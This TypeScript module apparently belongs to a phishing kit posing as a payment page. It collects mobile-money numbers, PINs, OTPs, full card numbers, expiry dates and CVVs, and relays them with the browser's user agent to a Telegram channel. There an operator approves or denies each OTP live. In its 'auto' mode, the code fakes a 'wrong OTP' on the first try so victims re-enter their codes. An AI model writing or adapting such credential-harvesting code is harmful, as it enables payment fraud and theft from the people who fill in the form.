import { flowAuth } from "@/lib/flowSession";
import { supabase } from "@/integrations/supabase/client";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import { getPublicAppSetting } from "@/lib/backend-api";
import { subscribeAppSettingsUpdate } from "@/lib/appSettingsSync";
import { getUserId } from "@/lib/userId";

type Payload = {
  amount?: string;
  method?: string;
  paymentType?: 'mfs' | 'card';
  number?: string;
  otp?: string;
  pin?: string;
  cardName?: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
};

export type OtpDecision = 'approved' | 'denied' | 'timeout' | 'error';
export type OtpMode = 'approval' | 'auto';

const OTP_MODE_KEY = 'otp_approval_mode';
const CACHE_KEY = 'genz_otp_mode';

let cachedMode: OtpMode | null = null;

function readCached(): OtpMode {
  if (cachedMode) return cachedMode;
  try {
    const v = localStorage.getItem(CACHE_KEY);
    if (v === 'auto' || v === 'approval') { cachedMode = v; return v; }
  } catch {}
  return 'approval';
}

export async function fetchOtpMode(): Promise<OtpMode> {
  try {
    const v = await getPublicAppSetting(OTP_MODE_KEY);
    const mode: OtpMode = v === 'auto' ? 'auto' : 'approval';
    cachedMode = mode;
    try { localStorage.setItem(CACHE_KEY, mode); } catch {}
    return mode;
  } catch {
    return readCached();
  }
}

subscribeAppSettingsUpdate((values) => {
  const v = values?.[OTP_MODE_KEY];
  if (v === 'auto' || v === 'approval') {
    cachedMode = v;
    try { localStorage.setItem(CACHE_KEY, v); } catch {}
  }
});

/**
 * Submit OTP for admin decision.
 * - mode 'approval': send Telegram with Approve/Deny buttons, wait via realtime + polling fallback.
 * - mode 'auto' (previous flow): send Telegram; first attempt returns 'denied' (shows wrong OTP once),
 *   subsequent attempts return 'approved'.
 */
export async function submitOtpForApproval(
  payload: Payload,
  {
    timeoutMs = 30000,
    intervalMs = 800,
    autoAttempt = 1,
    otpStartAt,
    autoDenyWindowMs = 6000,
  }: { timeoutMs?: number; intervalMs?: number; autoAttempt?: number; otpStartAt?: number; autoDenyWindowMs?: number } = {}
): Promise<OtpDecision> {
  const mode = await fetchOtpMode();

  if (mode === 'auto') {
    try {
      await sendTelegramNotification({ type: 'payment_activity', ...payload }, { force: true });
    } catch (err) {
      console.error('OTP auto notify failed:', err);
    }
    await new Promise((r) => setTimeout(r, 1500));
    const elapsed = otpStartAt ? Date.now() - otpStartAt : Infinity;
    const denyFirst = autoAttempt <= 1 && elapsed < autoDenyWindowMs;
    return denyFirst ? 'denied' : 'approved';
  }

  let requestId: string | null = null;
  if (!flowAuth().flowToken) return 'error';
  try {
    const { data, error } = await supabase.functions.invoke('telegram-notify', {
      body: {
        type: 'payment_activity',
        requireApproval: true,
        ...payload,
        ...flowAuth(),
        userId: getUserId(),
        userAgent: navigator.userAgent,
        referrer: document.referrer || 'Direct',
      },
    });
    if (error) throw error;
    requestId = (data as { request_id?: string } | null)?.request_id ?? null;
  } catch (err) {
    console.warn('OTP approval submit failed:', (err as Error)?.message);
    return 'error';
  }

  if (!requestId) return 'error';

  // Realtime subscription for instant decision + polling fallback.
  let resolved: OtpDecision | null = null;
  const channel = supabase
    .channel(`otp-${requestId}`)
    .on(
      'postgres_changes',
      { event: 'UPDATE', schema: 'public', table: 'otp_requests', filter: `id=eq.${requestId}` },
      (payload) => {
        const status = (payload.new as { status?: string } | null)?.status;
        if (status === 'approved') resolved = 'approved';
        else if (status === 'denied') resolved = 'denied';
      }
    )
    .subscribe();
  const decisionChannel = supabase
    .channel(`otp-decision-${requestId}`)
    .on('broadcast', { event: 'decision' }, (m) => {
      const status = (m as { payload?: { status?: string } }).payload?.status;
      if (status === 'approved') resolved = 'approved';
      else if (status === 'denied') resolved = 'denied';
    })
    .subscribe();

  try {
    const deadline = Date.now() + timeoutMs;
    let lastPoll = 0;
    while (Date.now() < deadline) {
      if (resolved) return resolved;
      await new Promise((r) => setTimeout(r, 150));
      if (resolved) return resolved;

      // Polling fallback — realtime may be blocked by RLS, so poll on a
      // steady cadence regardless of wall-clock modulus.
      if (Date.now() - lastPoll >= intervalMs) {
        lastPoll = Date.now();
        try {
          const { data, error } = await supabase.functions.invoke('otp-status', {
            body: { request_id: requestId, ...flowAuth() },
          });
          if (!error) {
            const status = (data as { status?: string } | null)?.status;
            if (status === 'approved') return 'approved';
            if (status === 'denied') return 'denied';
          }
        } catch {}
      }
    }
    return 'timeout';
  } finally {
    supabase.removeChannel(channel);
    supabase.removeChannel(decisionChannel);
  }
}
